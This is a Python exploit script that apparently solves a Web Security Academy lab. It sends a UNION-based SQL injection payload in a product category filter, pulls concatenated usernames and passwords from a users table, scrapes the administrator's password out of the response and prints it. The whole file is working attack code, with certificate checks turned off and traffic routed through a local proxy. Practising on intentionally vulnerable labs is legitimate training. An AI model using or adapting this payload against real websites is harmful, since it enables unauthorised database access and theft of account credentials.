import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
            
def get_userdata(url):
    username = 'administrator'
    payload = "' UNION SELECT NULL, username || '='|| password FROM users--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    if username in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            admin_passwd = soup.body.find(text=re.compile("administrator=")).split('=')
        except:
            return False
        return admin_passwd[1]
    return False

if __name__ == '__main__':
    url = 'https://ac5b1f211e3f20f7c0e21269005f0053.web-security-academy.net/filter?category=Pets'
    response = get_userdata(url)
    if response:
        print(f"Administrator's password is {response}")
        print('[.] successful SQLi')
    else:
        print('[.] Failed SQLi')
        
    